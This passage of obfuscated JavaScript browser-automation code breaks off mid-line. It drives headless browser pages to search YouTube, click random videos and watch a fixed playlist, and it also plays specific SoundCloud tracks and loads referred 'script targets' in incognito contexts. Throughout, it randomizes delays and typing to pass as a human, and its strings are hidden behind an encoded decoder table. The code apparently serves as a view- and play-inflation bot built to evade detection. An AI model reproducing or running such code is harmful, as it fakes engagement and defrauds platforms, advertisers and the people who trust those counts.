const W = d,
  V = b,
  U = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x912 + -0x23e7 + -0xd6b * -0x2))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x21bf + -0x768 + 0x2927), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x9 * -0x7f9 + -0x1 * -0x2a3e + 0x92b3 + (0x4e45 + 0x2 * -0x354b + 0x56e9) * random()) : await standardWaitForNetIdle(f), await wait(-0x239f + -0xbf5 * 0x2 + -0x8c9 * -0x9 + (-0x2dac + 0xfa6 + 0x228b * 0x2) * random()), 0x8 * -0x1 + -0x994 * 0x3 + -0xf * -0x1eb;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x2 * -0xf12 + -0x765 * 0x3 + 0x47db), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x88 + -0x4 * -0x917 + -0x24e3;
}
async function randomWait() {
  return await wait(0x1a8c * -0x1 + 0x25c1 + 0x853 + (0x3a0 + -0x148f + 0x2477) * random()), 0x2692 * -0x1 + -0x677 + 0x2d0a;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x15 * -0xf6 + 0x11c * 0x1b + -0x9c6);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0xad1 + -0x2 * -0xcc7 + -0xebd, 0x1 * -0x287 + -0xbd8 * -0x2 + -0x1522), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x1d418 + 0x27 * 0x5eb + -0xdb * 0x21f) * getRandomInt(-0x1818 + -0x1 * -0x356 + -0xc * -0x1bb, -0x1 * -0x25e7 + -0x1 * -0x242f + 0x11b * -0x43), h)), 0xb3 + -0xeda * -0x2 + -0x1e66;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x69e + -0x1 * 0xc8e + -0x8 * -0xbe;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x5c1 * -0x1 + 0x411 * -0x7 + -0x16b7 * -0x1]['split']('\x20');
    for (let k = -0xc1 * 0x1 + -0x5c * -0x64 + 0x232f * -0x1; k < i['length']; k += -0x1a90 + 0x2326 + -0x6 * 0x16e)
      j += i[k] * h[i[k + (0x74d + -0x829 * 0x4 + -0x2 * -0xcac)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x15 * -0xf6 + 0x11c * 0x1b + -0x9c6);
    let h = e[f];
    if (b['LtZKip'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x10c5 + 0x823 + 0x8a2, s, t, u = -0x7 * 0x309 + -0x328 + 0x1 * 0x1867; t = n['charAt'](u++); ~t && (s = r % (-0x23e7 + -0x1b67 * 0x1 + 0x3f52) ? s * (-0x768 + -0x23c0 + 0x2b68) + t : t, r++ % (0x385 * 0x2 + 0x13fb + -0x1b01)) ? p += String['fromCharCode'](0x1a17 + 0x4 * -0x8e2 + 0xa70 & s >> (-(-0x239f + -0xbf5 * 0x2 + -0x3b8b * -0x1) * r & -0x16d6 + 0x7d3 + 0xf09 * 0x1)) : 0x8 * -0x1 + -0x994 * 0x3 + -0x1c * -0x107) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2 * -0xf12 + -0x765 * 0x3 + 0x3453, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x88 + -0x4 * -0x917 + -0x24d4))['slice'](-(0x1a8c * -0x1 + 0x25c1 + -0xb33));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x3a0 + -0x148f + 0x10ef,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2692 * -0x1 + -0x677 + 0x2d09; u < -0xad1 + -0x2 * -0xcc7 + -0xdbd; u++) {
          p[u] = u;
        }
        for (u = 0x1 * -0x287 + -0xbd8 * -0x2 + -0x1529; u < 0x2702 + 0x2 * 0x99e + -0x22 * 0x1af; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1818 + -0x1 * -0x356 + -0xa * -0x22d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * -0x25e7 + -0x1 * -0x242f + 0xda * -0x57, q = 0xb3 + -0xeda * -0x2 + -0x1e67;
        for (let v = 0x69e + -0x1 * 0xc8e + -0x8 * -0xbe; v < n['length']; v++) {
          u = (u + (-0x5c1 * -0x1 + 0x411 * -0x7 + -0x16b7 * -0x1)) % (-0xc1 * 0x1 + -0x5c * -0x64 + 0x222f * -0x1), q = (q + p[u]) % (-0x1a90 + 0x2326 + -0x2 * 0x3cb), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x74d + -0x829 * 0x4 + -0x1 * -0x1a57)]);
        }
        return t;
      };
      b['FfQahK'] = m, c = arguments, b['LtZKip'] = !![];
    }
    const j = e[-0x71 * 0x5 + 0x16f9 + -0x3 * 0x6ec],
      k = f + j,
      l = c[k];
    return !l ? (b['WrJXxq'] === undefined && (b['WrJXxq'] = !![]), h = b['FfQahK'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x71 * 0x5 + 0x16f9 + -0x6 * 0x375)['map'](l => Array['from'](l['children']))['flat'](0x1822 * -0x1 + -0x2634 * 0x1 + 0x3e57)['map'](l => l['childNodes'][-0x40 * 0x46 + 0x11 * 0x136 + 0x3 * -0x107]['childNodes'][0x188e + -0x7e8 + -0x10a6 * 0x1]['childNodes'][0x996 + -0x4 * -0xe8 + -0xd35]['childNodes'][-0x26e8 * -0x1 + 0x1d12 + -0x43fa]['childNodes'][-0x22a0 + 0x1c1 * -0x4 + 0x29a5]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x253a + 0xb * 0x30f + 0x77d, 0x104d + 0x2169 + 0x2 * -0xf17)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x12dc * -0x6 + -0x1f51 + 0xcb11);
  const h = await getMaxTime(f),
    i = Math['min']((0x5837 + 0x82a4 + 0x1d * 0x89) * getRandomInt(0xcf7 * -0x3 + -0x4f * 0x66 + -0x2b * -0x1a3, 0x2632 * 0x1 + 0x1 * -0x15cd + 0x830 * -0x2), h);
  return await wait(i), -0x1 * -0x140e + -0x23b9 + 0xfac;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xd * -0x283 + -0x249e + 0x3f7]['children'][0xb3 * -0x17 + -0x26b3 + 0x36c8]['children'][0x120f + -0x2f3 * -0x2 + -0x17f5 * 0x1]['children'][-0xd * 0x2dd + -0x1336 * 0x2 + 0x4ba5]['children'][0x18f9 + -0x2622 + 0xd29]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x124 + -0x89b + 0x9c0;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const R = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + R(0xd)) || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1eb6 + -0xbab * -0x1 + 0x136f + (0x218 + 0x5 * 0x1 + -0x1eb) * random()
  }), await wait(0x13 * -0x119 + 0x538 + 0x1197 + (0x1774 + -0x5a7 * 0x2 + 0x5 * -0x232) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x3aa * 0x3 + -0x2 * 0xa2f + 0x962]['childNodes'][-0x1da8 + 0x1c07 * 0x1 + -0x13 * -0x16]['childNodes'][-0x18ea + 0x987 + 0xf64 * 0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x7bd + -0x1a3 * 0x5 + 0xff1]['childNodes'][0x6d9 * -0x5 + 0x2188 + 0xb5]['childNodes'][0xcc1 + 0x1211 + -0x1ed0]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xa4e + 0x23f * 0x1 + -0x16 * 0x92),
          r = -0xf15 + -0x176e + 0x2683 * 0x1;
        for (let u = 0x11e7 * -0x2 + 0x1816 + 0xbb8; u < q['length']; u += -0x1 * 0xf5b + 0x1914 + 0x1 * -0x9b7)
          r += q[u] * k[q[u + (0x1 * 0x1ff3 + -0xa4d * -0x3 + 0x3ed9 * -0x1)]];
        return r;
      }(n);
  });
  await wait((-0x11 * -0x40b + -0x43 * -0x2 + -0xaa9) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xd0b + 0xf880 + 0x5 * -0x56f) * getRandomInt(0x185 * -0x17 + -0x1b6e + 0x3e62 * 0x1, -0x2299 * -0x1 + 0x1291 + -0x6a4 * 0x8), h + (0x17b * 0x5 + -0x7d8 + 0x13f9));
  return await wait(i), -0x21 * -0xa3 + 0x3 * 0x65 + -0x1631;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x15 * -0xf6 + 0x11c * 0x1b + -0x9c6);
    let h = e[f];
    if (c['AqNIha'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x10c5 + 0x823 + 0x8a2, r, s, t = -0x7 * 0x309 + -0x328 + 0x1 * 0x1867; s = m['charAt'](t++); ~s && (r = q % (-0x23e7 + -0x1b67 * 0x1 + 0x3f52) ? r * (-0x768 + -0x23c0 + 0x2b68) + s : s, q++ % (0x385 * 0x2 + 0x13fb + -0x1b01)) ? o += String['fromCharCode'](0x1a17 + 0x4 * -0x8e2 + 0xa70 & r >> (-(-0x239f + -0xbf5 * 0x2 + -0x3b8b * -0x1) * q & -0x16d6 + 0x7d3 + 0xf09 * 0x1)) : 0x8 * -0x1 + -0x994 * 0x3 + -0x1c * -0x107) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2 * -0xf12 + -0x765 * 0x3 + 0x3453, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x88 + -0x4 * -0x917 + -0x24d4))['slice'](-(0x1a8c * -0x1 + 0x25c1 + -0xb33));
        }
        return decodeURIComponent(p);
      };
      c['DXaQYv'] = i, b = arguments, c['AqNIha'] = !![];
    }
    const j = e[0x3a0 + -0x148f + 0x10ef],
      k = f + j,
      l = b[k];
    return !l ? (h = c['DXaQYv'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const bk = [
    'Ahr0Chm6lY9NCG',
    'vLn2qtrYq2uTna',
    'D3jPDgvizwfK',
    'D0GRBeaGpZ3cTra',
    'ChrZl2j5lxnPDa',
    'crpcLSkMWRS',
    'CY1JBgfZC2vZlq',
    'amoNW7tdSqLqW7RdV8ohW7G',
    'easyfork.o',
    'DmkZCqqRDKBdMSkEWRC',
    'WRVcIGLNW7e4Dr0gaa',
    'sgnqx3HTzhDZBa',
    'ienOCM9Tzs8Xma',
    'EfjLywW',
    'ri/537.36',
    'start',
    'lwXPzNqTD2vIlq',
    'CMSUz2XPDgnOlG'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x17d5 * 0x1 + 0x1 * -0x21f + -0x4 * -0x67d), log('clicking..' + '.'), await f[S(0x5, 'N)PY')]('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1d52 + 0x252c + -0x36c6 + (0x1270 + 0x23 * -0x44 + 0x5 * -0x10c) * Math['random']());
    });
  }, -0x2e * -0x1f + -0x3435 + -0x141 * -0x3b);
  await wait(0x35b7b + 0x8a412 + -0x76bad);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x5e22 * -0x1 + -0x17d0b + -0x5 * -0x8de9) * getRandomInt(-0x4 * -0x3e5 + 0x225e + -0x1 * 0x31ee, 0xbcb + -0x582 + 0xb0 * -0x9)), clearInterval(h), -0xee0 + 0xfbe + -0xdd;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0xa98 + 0x2ed * 0x7 + -0x9e3;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1b05 * -0x1 + -0x2d5 + 0x1ddb;
    await randomWait();
  }
  return 0x38f + 0x16bd + -0x1 * 0x1a4b;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1 * -0xc46 + 0x1cd0 + 0x2 * -0x148b + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0xaf0 + 0xcd1 + -0x1 * 0x17c1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x22a4 + -0x1 * 0x179 + 0x4bd * -0x7 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xa71 + 0xd13 + 0x151 * -0x2;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x1f7 * 0x6d + -0x1295f + 0x102fc + getRandomInt(0xc4 * -0x41 + 0x6652 + 0x60a, 0x1d * -0x10b + 0xf * -0x97b + 0x3046 * 0x6));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xca4 + -0x355 * 0x7 + 0x23f8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x11c * 0x8 + -0xc2c + 0x382 * 0x6;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1e17 + -0x4 * -0x4af + -0x1 * 0x30d3, 0x71d + -0xec5 + 0x7da)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x16d1 + 0x5d8 + -0x14d9 + floor((-0x933 + -0x1e3a + 0x2b55) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x35e9aa9c * 0x1 + -0xfad9638 + 0xc59740d4),
          0x512a1c + -0x8f434 * 0x1a + 0x117a32c,
          0xdf * 0x94 + -0x5c9e + -0x2 * -0x2dd9,
          0x25e6 + -0x2591 * 0x1 + 0x2b
        ], y = [
          -0x1a03 + -0x1b78 + 0x3593,
          0x8 * -0x4ca + 0x3 * 0x653 + 0x1367,
          -0x711 + -0x1 * -0x16ba + -0xfa1 * 0x1,
          -0x2281 + -0xb * -0x301 + 0x176
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x118a + -0x255a + -0xd * -0x439)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x237d + -0x1b2d + 0x3eaa; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xa3a + -0x3 * -0x269 + -0x29 * 0x6d) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x69 + 0x1 * -0xb57 + -0x40 * -0x2f] = A[0x1 * 0x871 + 0x40 * -0x6f + -0x13 * -0x105] = A[-0x8 * -0xd9 + -0xfb5 + -0x12 * -0x7f] = A[-0x1 * -0x2377 + -0x1b3f + -0x836] = A[-0x1 * -0x1b4 + 0x1 * -0x5e7 + -0x436 * -0x1] = A[0xa * -0x2b6 + 0x113e * -0x2 + -0x3d9c * -0x1] = A[0x5 * 0x1c1 + 0x1659 + -0x1 * 0x1f19] = A[0x7 * -0x175 + 0x71 * 0x2b + 0x2 * -0x461] = A[0x19ec + 0x15cd + -0x2fb2] = A[0x332 * -0x5 + 0x5 * -0x3b + 0x1129] = A[-0x10b1 * -0x1 + -0xb52 + -0x556] = A[-0xc * -0x97 + -0x220b + 0xdf * 0x1f] = A[-0x1 * -0x1bf7 + -0x5ca + 0xb11 * -0x2] = A[0x4ce + 0x2510 + -0xca * 0x35] = A[-0x2ee + 0x8de + 0xb * -0x89] = A[0x145b + 0x49a + -0x18e7] = A[-0x1275 * 0x2 + -0x91b + 0x2e14] = -0x213 * 0x1 + 0xd42 + 0xb2f * -0x1, this['blocks'] = A) : this['blocks'] = [
                -0xb * 0x24b + -0x1 * -0x571 + 0x13c8,
                -0x31f * 0x5 + 0x242 * 0xc + -0xb7d,
                0x22 * -0x3d + -0x19c1 + 0x141 * 0x1b,
                0x8ab + -0x124b + -0x9a0 * -0x1,
                -0x706 + 0x1b7 * -0x10 + 0x2276,
                -0x11f7 + -0xf23 * -0x2 + 0x17 * -0x89,
                -0xc2 * -0x3 + 0x6f7 * 0x1 + -0xd7 * 0xb,
                -0x1f72 + -0x25aa + -0x2 * -0x228e,
                -0x5 * 0x2e + -0x15 * 0x40 + 0x626,
                0x164b + 0x4ab * -0x1 + -0x11a0,
                0x1 * -0xc74 + 0x283 * -0x1 + 0xef7,
                0xd18 + -0x135b + 0x643,
                0xe65 * -0x2 + 0xf * -0x10f + -0x8ef * -0x5,
                0x322 + 0x246 + -0x4 * 0x15a,
                0x2651 + -0x11ee + -0x1463,
                -0x1 * -0xcad + 0xbd * -0x30 + 0x16c3,
                0x21f3 + -0xad5 + -0x171e
              ], this['h0'] = -0x99b86415 * 0x1 + -0x1 * 0xc908e112 + -0x1ca066828 * -0x1, this['h1'] = -0x1bba0e0ea + -0xa127a53 + 0x12 * 0x26872b0b, this['h2'] = 0x585c6ad7 * -0x1 + -0x11fee0488 + -0x1 * -0x211054c5d, this['h3'] = 0x1ca * -0xf26aa + 0x1059aa22 + -0x18 * -0x11f7e45, this['h4'] = 0x5eaf53f5 + -0xdaa279c8 + -0x1 * -0x13fc607c3, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1192 + 0x359 * -0x3 + 0x1b9d, this['finalized'] = this['hashed'] = 0x1802 + -0x2 * -0xc74 + -0x30ea, this['first'] = -0x3 * -0x10d + -0x2016 + 0x1cf0;
            }
            ['update'](J) {
              const T = d;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1edd + -0x1948 + -0x595, O = J['length'] || 0x164e + 0x52d + 0x3 * -0x929, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x20 * 0xb0 + 0x14ab + -0x2aab, P[0xe7b * 0x1 + 0x1b9a + -0x2a15] = this['block'], P[0x434 + 0x767 * -0x2 + 0x2a * 0x41] = P[0x33 * -0x47 + -0xd5 * -0x21 + -0xd4f * 0x1] = P[0x790 + -0x21d3 + 0x1 * 0x1a45] = P[0x187d + -0x1016 + -0x864] = P[0x200 + 0x1 * -0x152d + 0x1331] = P[-0x5cf * -0x1 + -0x3 * -0x88b + 0x47d * -0x7] = P[0x1233 * -0x1 + 0x1aae + -0x875] = P[-0x3 * 0x1bb + 0x14 * 0xf8 + -0xe28] = P[-0x2638 + 0x365 + 0x22db * 0x1] = P[0x2b2 * 0x7 + 0x3 * 0x76d + -0x291c] = P[0x3a6 + 0x1def + -0x1 * 0x218b] = P[-0x29 * -0xe5 + 0x1 * 0x1424 + -0x38c6] = P[-0x1 * -0x2027 + -0x16b * 0x3 + -0x1bda] = P[-0x14d * 0x5 + -0x26a2 + -0x2d30 * -0x1] = P[0x2084 + 0x1 * 0x1ed4 + -0x2 * 0x1fa5] = P[0xec * 0x16 + 0x374 + -0x17ad] = 0x2e7 * 0xb + 0x1916 + -0x3903), K) {
                    for (N = this['start']; M < O && N < 0x24bf + -0x3 * 0xbe1 + 0x2 * -0x6e; ++M)
                      P[N >> 0x1 * -0x2309 + 0x114d + -0x3 * -0x5ea] |= J[M] << y[-0x70b * -0x3 + -0x436 + -0x10e8 & N++];
                  } else {
                    for (N = this[T(0xf)]; M < O && N < -0x26cc + -0x289 + -0x2995 * -0x1; ++M)
                      (L = J['charCodeAt'](M)) < -0xb * 0x243 + -0x2194 + 0x1b * 0x22f ? P[N >> 0x9d * 0x15 + 0x2233 + -0x2f12] |= L << y[0x836 + -0x1e4d * 0x1 + 0x161a & N++] : L < -0x1066 + 0x2a4 * -0xc + 0x959 * 0x6 ? (P[N >> 0x9b8 + 0xab7 * -0x2 + -0x1e * -0x64] |= (-0x1bc5 + -0x16b6 + -0x1 * -0x333b | L >> 0x3 * -0xaeb + -0x1da2 + -0x4cd * -0xd) << y[-0x1b * 0x52 + 0x554 + -0x1 * -0x355 & N++], P[N >> -0x1688 + -0x1 * 0x1a4f + 0x30d9] |= (0x29a + 0x1 * 0x1521 + -0x173b | -0x1aa4 + 0x2cf + 0xc0a * 0x2 & L) << y[0x1 * -0x10ba + -0x1ab6 + -0x2b73 * -0x1 & N++]) : L < -0xd3 * -0x11 + -0x1a * -0xd40 + 0x3 * -0x2f81 || L >= -0x2 * -0x5aee + 0x157a * -0xb + 0x11662 ? (P[N >> 0xe * -0x66 + -0xe8c + 0x1422] |= (-0xb * -0x9c + 0xa22 + -0xff6 | L >> -0x5 * -0x3fe + -0x21f * -0xd + -0x2f7d) << y[0x1a42 + 0x167 * 0x8 + -0x2577 & N++], P[N >> -0x1adb + -0x2 * -0x869 + 0x3 * 0x359] |= (-0x17fb + -0x164e + 0x2ec9 | L >> 0x7b3 + -0x1f70 + 0x17c3 & 0x216c + -0x4cd * 0x7 + 0x6e) << y[0x1099 + -0x3 * 0x477 + 0x1 * -0x331 & N++], P[N >> -0x19a0 + -0x1d * -0x34 + -0x2d2 * -0x7] |= (-0x1 * -0x68b + -0x33 * 0x57 + -0x2 * -0x5a5 | 0x125 * -0x7 + 0xca2 + -0x46 * 0x10 & L) << y[-0x2 * 0x60d + 0x603 + 0x8e * 0xb & N++]) : (L = 0x118be + 0xbb * -0x7d + 0x4291 + ((-0x170 * -0x17 + 0x14c2 + 0x1 * -0x31d3 & L) << -0xef9 * -0x1 + 0x1 * 0x2359 + -0xc92 * 0x4 | 0x197 * -0x17 + 0xa37 + 0x1e59 & J['charCodeAt'](++M)), P[N >> -0x1 * 0xa3d + -0x169d * -0x1 + -0x62f * 0x2] |= (0x10d * -0x1f + 0xefe + 0x1285 | L >> 0x6d * 0x43 + -0x28a + -0x19eb) << y[-0x13c * -0xb + 0x7 * 0x65 + -0x1054 & N++], P[N >> 0x7ff + -0x2 * 0x5b9 + 0xf * 0x3b] |= (0x1d * 0x63 + -0x1c85 + 0x11ce | L >> -0x546 + 0x1d16 + 0x1a * -0xea & 